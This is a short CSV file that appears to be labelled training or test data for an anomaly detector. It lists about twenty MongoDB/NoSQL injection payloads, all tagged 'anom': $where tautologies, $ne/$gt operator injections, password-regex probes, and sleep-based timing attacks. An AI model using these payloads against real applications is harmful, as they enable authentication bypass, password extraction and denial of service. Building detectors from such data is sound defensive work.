payload,label
"true, $where: '1 == 1'",anom
", $where: '1 == 1'",anom
$where: '1 == 1',anom
"', $where: '1 == 1'",anom
"1, $where: '1 == 1'",anom
{ $ne: 1 },anom
"', $or: [ {}, { 'a':'a",anom
"' } ], $comment:'successful MongoDB injection'",anom
db.injection.insert({success:1});,anom
"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",anom
|| 1==1,anom
' && this.password.match(/.*/)//+%00,anom
' && this.passwordzz.match(/.*/)//+%00,anom
'%20%26%26%20this.password.match(/.*/)//+%00,anom
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,anom
{$gt: ''},anom
[$ne]=1,anom
';sleep(5000);,anom
';sleep(5000);',anom
';sleep(5000);+',anom
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,anom
